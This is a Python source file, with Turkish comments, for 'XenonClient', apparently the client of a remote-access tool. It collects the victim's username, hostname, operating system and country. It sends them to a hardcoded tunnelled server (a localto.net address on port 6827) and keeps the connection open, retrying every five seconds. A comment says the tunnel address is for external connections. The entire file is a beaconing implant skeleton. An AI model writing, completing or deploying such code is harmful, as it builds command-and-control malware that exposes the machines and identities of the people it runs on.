import socket
import platform
import getpass
import json
import time
import urllib.request

class XenonClient:
    def __init__(self, server_ip, server_port):
        self.server_ip = server_ip
        self.server_port = server_port

    def get_recon_data(self):
        recon = {
            "id": f"{getpass.getuser()}@{platform.node()}",
            "os": f"{platform.system()} {platform.release()}",
            "country": "Unknown"
        }
        try:
            # Zaman aşımını kısa tutup hata almasını önledik
            with urllib.request.urlopen("http://ip-api.com/json/", timeout=3) as response:
                data = json.loads(response.read().decode())
                recon["country"] = data.get("countryCode", "??")
        except:
            recon["country"] = "N/A"
        return recon

    def run(self):
        print(f"[*] {self.server_ip}:{self.server_port} adresine bağlanılıyor...")
        while True:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                # Bağlantı zaman aşımı
                self.sock.settimeout(10)
                self.sock.connect((self.server_ip, self.server_port))
                
                print("[+] Sunucuya bağlandı! Veriler gönderiliyor...")
                
                # Veriyi hazırla ve gönder
                recon_packet = self.get_recon_data()
                self.sock.send(json.dumps(recon_packet).encode("utf-8"))
                
                # Bağlantıyı açık tut
                self.sock.settimeout(None)
                while True:
                    data = self.sock.recv(1024)
                    if not data: break
                    
            except Exception as e:
                print(f"[-] Bağlantı hatası: {e}. 5 saniye sonra tekrar denenecek...")
                time.sleep(5)
            finally:
                try: self.sock.close()
                except: pass

if __name__ == "__main__":
    # LOCAL TEST İÇİN: 127.0.0.1 ve 1604 kullan.
    # DIŞ BAĞLANTI İÇİN: Localtonet adresini buraya yaz.
    client = XenonClient("uwtd3ffva.localto.net", 6827)
    client.run()

